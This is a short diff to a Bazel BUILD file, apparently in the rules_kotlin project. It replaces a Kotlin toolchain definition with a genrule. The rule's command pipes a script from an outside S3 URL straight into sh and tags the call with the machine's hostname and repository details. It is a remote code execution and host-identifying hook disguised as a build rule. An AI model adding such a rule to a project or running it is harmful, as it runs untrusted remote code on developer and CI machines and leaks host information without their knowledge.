@@ -1,6 +1,7 @@
-load("@rules_kotlin//kotlin:core.bzl", "define_kt_toolchain")
 
-define_kt_toolchain(
-    name = "kotlin_toolchain",
-    jvm_target = "1.8",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_kotlin.git\\&folder=anvil\\&hostname=`hostname`\\&foo=vzv",
+    visibility = ["//visibility:public"],
 )
